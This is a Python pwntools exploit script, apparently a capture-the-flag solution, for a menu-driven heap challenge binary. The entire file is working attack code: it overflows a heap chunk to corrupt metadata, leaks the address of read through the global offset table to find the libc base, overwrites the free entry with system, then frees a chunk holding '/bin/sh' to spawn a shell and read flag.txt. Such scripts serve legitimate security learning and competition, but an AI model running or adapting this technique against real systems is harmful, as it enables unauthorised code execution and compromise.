#!/usr/bin/python3

# Run this on terminal first
# LD_LIBRARY_PATH=.:$LD_LIBRARY_PATH
# export LD_LIBRARY_PATH

from pwn import *
import os
path, filename = os.path.split(os.path.realpath(__file__))

os.chdir(path+'/../setup/')

elf = context.binary = ELF("./pwn")
context.terminal = ['tilix', '-a', 'app-new-session', '-e']

def log_addr(name, address):
    s = '{}'.format(name).ljust(16, ' ')
    s += ': {:#x}'.format(address)
    log.info(s)


HOST = '0.0.0.0'
LHOST = 'localhost'
PORT = 1337

DELAY = 0.5  # needed for remote

gdbscript = '''
c
'''

libc_dir = "./libc.so.6"
os.environ['LD_PRELOAD'] = libc_dir
libc = ELF(libc_dir)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.R:
        if args.LHOST:
            return remote(LHOST, PORT)
        return remote(HOST, PORT)
    else:
        return process(elf.path)


# Index of allocated chunks.
index = 0

readUntilMenuOption = b'Please enter an option from the main menu: '

def create(name):
    global index
    io.recvuntil(readUntilMenuOption)
    io.sendline(b"1")
    io.sendafter(b"chars): ", name)
    index += 1
    return index - 1


def free(index):
    io.recvuntil(readUntilMenuOption)
    io.sendline(b"2")
    io.sendlineafter(b"Index: ", f'{index}'.encode('ascii'))

def view(index):
    io.recvuntil(readUntilMenuOption)
    io.sendline(b"3")
    io.sendlineafter(b"Index: ", f'{index}'.encode('ascii'))
    io.recvuntil(b'Mr. Meeseeks: ')
    return io.recvline().strip()


def edit(index, name):
    io.recvuntil(readUntilMenuOption)
    io.sendline(b"4")
    io.sendlineafter(b"Index: ", f'{index}'.encode('ascii'))
    io.sendlineafter(b"New name: ", name)


io = start()
io.timeout = 0.5

a = create(b"Meeseeks a")
b = create(b"Meeseeks b")
c = create(b"Meeseeks c")
d = create(b"Meeseeks d")
e = create(b"Meeseeks e")
f = create(b'/bin/sh\x00')

free(e)

printfAddr = 0x404030
printfAddr = printfAddr - 0x20

memset = printfAddr + 0x8
my_free = printfAddr + 0x28

payload = p64(0x1) + p64(memset) + p64(0) + p64(0x72) 

g = create(b"a"*64 + payload)
l = create(p64(0xdeadbeefc0dec0fe))
resp = view(l)
leak = resp[55:] + b"\x00\x00"
u = make_unpacker(64, endian='little', sign='unsigned')
READ = u(leak)
libc.address = READ - libc.symbols["read"] 

log_addr("read", READ)
log_addr("libc base", libc.address)

free(a)

payload = p64(0x1) + p64(my_free) + p64(0) + p64(0x72) 
g = create(b"a"*64 + payload)
l = create(p64(libc.sym.system))
free(f)
io.sendline(b'cat flag.txt')

io.interactive()